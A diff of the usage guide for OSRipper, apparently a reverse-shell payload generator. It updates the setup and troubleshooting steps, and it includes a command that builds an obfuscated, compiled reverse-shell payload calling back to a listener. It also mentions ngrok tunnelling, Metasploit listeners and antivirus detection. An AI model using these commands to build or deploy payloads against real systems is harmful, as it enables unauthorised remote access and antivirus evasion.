@@ -15,33 +15,34 @@ This comprehensive guide covers all aspects of using OSRipper v0.3.1 for payload
 
 ## Quick Start
 
+### First-time setup (important)
+
+After installing OSRipper (via pip or your distro package), run **setup once** so optional features work (ngrok tunnel listing, compiling payloads to binaries). On Linux this also avoids “externally managed environment” errors by using a dedicated venv:
+
+```bash
+osripper-cli setup
+```
+
+This installs **pyngrok**, **nuitka**, and **sandboxed** into `~/.local/share/osripper/venv`. All later runs of `osripper` and `osripper-cli` use this venv automatically—no activation needed.
+
 ### Basic Usage
 
-1. **Interactive Mode (Recommended for beginners)**
+1. **Interactive Mode (recommended for beginners)**
    ```bash
-   sudo python3 main.py
+   osripper
+   # or
+   python3 -m osripper
    ```
 
-2. **Command Line Mode (Advanced users)**
+2. **Command Line Mode**
    ```bash
-   python3 cli.py reverse -h 192.168.1.100 -p 4444 --obfuscate --compile
+   osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --compile
    ```
 
-### First Time Setup
-
-1. Install dependencies:
+3. **Configuration (optional)**  
+   Create a sample config with:
    ```bash
-   pip3 install -r requirements.txt
-   ```
-
-2. Run setup script:
-   ```bash
-   sudo python3 setup.py
-   ```
-
-3. Create configuration file:
-   ```bash
-   python3 config.py --create-sample
+   python3 -m osripper.config --create-sample
    ```
 
 ## Interactive Mode
@@ -385,31 +386,36 @@ python3 cli.py reverse --ngrok -p 4444
 
 ### Common Issues
 
-#### 1. Compilation Fails
+#### 1. “Run: osripper-cli setup” / Compilation or ngrok fails
+If you see messages like “Nuitka is not installed” or “ngrok support requires the 'pyngrok' package”, or compilation fails with a missing module:
+
+**Solution:** Run the built-in setup once. This installs optional dependencies (pyngrok, nuitka, sandboxed) into OSRipper’s venv and is required for `--ngrok` and `--compile`:
+
 ```bash
-❌ Compilation failed
-Error: No module named 'nuitka'
+osripper-cli setup
 ```
 
-**Solution**:
+#### 2. “externally managed environment” / pip install blocked
+On many Linux distros (e.g. Debian, Parrot, Fedora), the system Python blocks direct `pip install`:
+
+**Solution:** Use OSRipper’s setup instead of installing packages yourself. It creates a venv and installs optional deps there; the tool uses that venv automatically:
+
 ```bash
-pip3 install nuitka
-# or
-pip3 install -r requirements.txt
+osripper-cli setup
 ```
 
-#### 2. Ngrok Connection Issues
+#### 3. Ngrok connection / tunnel issues
 ```bash
 ❌ Ngrok setup failed
 ```
 
 **Solutions**:
-- Check API token configuration
-- Verify ngrok is installed: `ngrok version`
-- Check internet connectivity
-- Try different region in config
+- Run `osripper-cli setup` so the `pyngrok` package is available.
+- Check API token (e.g. in `creds` or config).
+- Verify ngrok CLI if used separately: `ngrok version`
+- Check internet connectivity and region/config
 
-#### 3. Metasploit Listener Not Starting
+#### 4. Metasploit Listener Not Starting
 ```bash
 ❌ Failed to start listener
 ```
@@ -419,7 +425,7 @@ pip3 install -r requirements.txt
 - Check port availability: `netstat -ln | grep 4444`
 - Run with proper privileges: `sudo`
 
-#### 4. Payload Detection
+#### 5. Payload Detection
 ```bash
 Payload detected by antivirus
 ```
